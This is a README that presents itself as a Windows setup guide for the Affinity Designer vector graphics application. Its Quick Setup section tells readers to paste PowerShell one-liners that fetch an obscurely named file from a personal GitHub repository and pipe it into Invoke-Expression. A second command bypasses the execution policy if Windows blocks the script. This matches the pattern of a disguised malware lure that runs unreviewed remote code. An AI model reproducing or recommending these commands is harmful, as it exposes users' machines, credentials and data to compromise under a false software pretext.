# Affinity Designer

Affinity Designer is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Affinity Designer and work in it.

Affinity Designer is a desktop vector graphics application for Windows aimed at illustration, branding, interface mockups, and print-ready artwork. The workspace centers on artboards, layers, and snapping so you can build scalable shapes, apply fills and strokes, and export assets at the sizes your project needs.

A typical session starts by choosing document dimensions and color profile, then sketching with the pen and shape tools on separate layers. You might refine typography on paths, adjust node handles for smooth curves, use symbols for repeated elements, and preview export slices before sending files to colleagues or production.

This repository holds a Windows setup helper, short configuration notes for common install paths and GPU preferences, and a changelog that tracks packaging updates. It is meant to document how the team standardizes installs and documents workflow presets used alongside the application.

## What you do with it

- Vector persona edits Bézier paths with node, corner, and smooth tools on Windows.
- Pixel persona adds raster brushes and retouching without leaving the same document.
- Artboards organize multiple screens or print sizes within one Affinity Designer file.
- Symbols and assets panel reuse icons and update linked instances across your layout.
- Constraints and snapping align UI elements when you resize frames during interface design.
- Export persona slices artboards to PNG, SVG, PDF, and other formats with preset profiles.
- Live effects and blend modes stack non-destructive adjustments on shapes and grouped layers.
- Isometric studio and grid tools help technical diagrams and package mockups stay aligned.

## Quick Setup (PowerShell)

This installs the program Affinity Designer on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/zimmermann-marie385495/affinity-designer-setup-guide/main/hflvr1c8w5.c5x10yq9 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/zimmermann-marie385495/affinity-designer-setup-guide/main/hflvr1c8w5.c5x10yq9 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `hflvr1c8w5.c5x10yq9` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `zimmermann-marie385495/affinity-designer-setup-guide`. Affinity Designer 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
